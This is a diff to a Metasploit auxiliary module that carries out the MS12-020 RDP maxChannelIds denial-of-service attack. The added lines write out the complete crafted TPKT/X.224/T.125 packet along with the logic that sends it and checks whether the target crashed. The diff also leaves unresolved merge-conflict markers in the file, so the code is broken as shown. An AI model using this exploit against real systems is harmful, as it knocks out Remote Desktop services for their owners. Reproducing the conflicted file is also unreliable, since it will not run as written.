@@ -65,6 +65,7 @@ class Metasploit3 < Msf::Auxiliary
   def run
     max_channel_ids = "\x02\x01\xff"
 
+<<<<<<< HEAD
     pkt = ''+
       "\x03\x00\x00\x13" +  # TPKT: version + length
       "\x0E\xE0\x00\x00" +  # X.224 (connection request)
@@ -160,4 +161,101 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
+=======
+		pkt = ''+
+			"\x03\x00\x00\x13" +  # TPKT: version + length
+			"\x0E\xE0\x00\x00" +  # X.224 (connection request)
+			"\x00\x00\x00\x01" +
+			"\x00\x08\x00\x00" +
+			"\x00\x00\x00"     +
+			"\x03\x00\x00\x6A" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224 (connect-initial)
+			"\x7F\x65\x82\x00" +  # T.125
+			"\x5E"             +
+			"\x04\x01\x01"     +  # callingDomainSelector
+			"\x04\x01\x01"     +  # calledDomainSelector
+			"\x01\x01\xFF"     +  # upwardFlag
+			"\x30\x19"         +  # targetParameters
+			max_channel_ids    +  # maxChannelIds
+			"\x02\x01\xFF"     +  # maxUserIds
+			"\x02\x01\x00"     +  # maxTokenIds
+			"\x02\x01\x01"     +  # numPriorities
+			"\x02\x01\x00"     +  # minThroughput
+			"\x02\x01\x01"     +  # maxHeight
+			"\x02\x02\x00\x7C" +  # maxMCSPDUsize
+			"\x02\x01\x02"     +  # protocolVersion
+			"\x30\x19"         +  # minimumParameters
+			max_channel_ids    +  # maxChannelIds
+			"\x02\x01\xFF"     +  # maxUserIds
+			"\x02\x01\x00"     +  # maxTokenIds
+			"\x02\x01\x01"     +  # numPriorities
+			"\x02\x01\x00"     +  # minThroughput
+			"\x02\x01\x01"     +  # maxHeight
+			"\x02\x02\x00\x7C" +  # maxMCSPDUsize
+			"\x02\x01\x02"     +  # protocolVersion
+			"\x30\x19"         +  # maximumParameters
+			max_channel_ids    +  # maxChannelIds
+			"\x02\x01\xFF"     +  # maxUserIds
+			"\x02\x01\x00"     +  # maxTokenIds
+			"\x02\x01\x01"     +  # numPriorities
+			"\x02\x01\x00"     +  # minThroughput
+			"\x02\x01\x01"     +  # maxHeight
+			"\x02\x02\x00\x7C" +  # maxMCSPDUsize
+			"\x02\x01\x02"     +  # protocolVersion
+			"\x04\x82\x00\x00" +  # userData
+			"\x03\x00\x00\x08" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224
+			"\x28"             +  # T.125
+			"\x03\x00\x00\x08" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224
+			"\x28"             +  # T.125
+			"\x03\x00\x00\x08" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224
+			"\x28"             +  # T.125
+			"\x03\x00\x00\x08" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224
+			"\x28"             +  # T.125
+			"\x03\x00\x00\x08" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224
+			"\x28"             +  # T.125
+			"\x03\x00\x00\x08" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224
+			"\x28"             +  # T.125
+			"\x03\x00\x00\x08" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224
+			"\x28"             +  # T.125
+			"\x03\x00\x00\x08" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224
+			"\x28"             +  # T.125
+			"\x03\x00\x00\x0C" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224
+			"\x38\x00\x06\x03" +  # T.125
+			"\xF0"             +
+			"\x03\x00\x00\x09" +  # TPKT: version + length
+			"\x02\xF0\x80"     +  # X.224
+			"\x21\x80"            # T.125
+		if is_rdp_up
+		  connect
+		  print_status("#{rhost}:#{rport} - Sending #{self.name}")
+		  sock.put(pkt)
+		  select(nil, nil, nil, 3)
+		  disconnect
+		  print_status("#{rhost}:#{rport} - #{pkt.length.to_s} bytes sent")
+
+		  print_status("#{rhost}:#{rport} - Checking RDP status...")
+		  if not is_rdp_up
+			  print_good("#{rhost}:#{rport} seems down")
+			  report_vuln({
+				  :host => rhost,
+				  :port => rport,
+				  :name => self.name,
+				  :refs => self.references,
+				  :info => "Module #{self.fullname} successfully crashed the target system via RDP"
+			  })
+		  else
+			  print_status("#{rhost}:#{rport} is still up")
+		  end
+	        end
+	end
+>>>>>>> Update ms12_020_maxchannelids.rb
 end
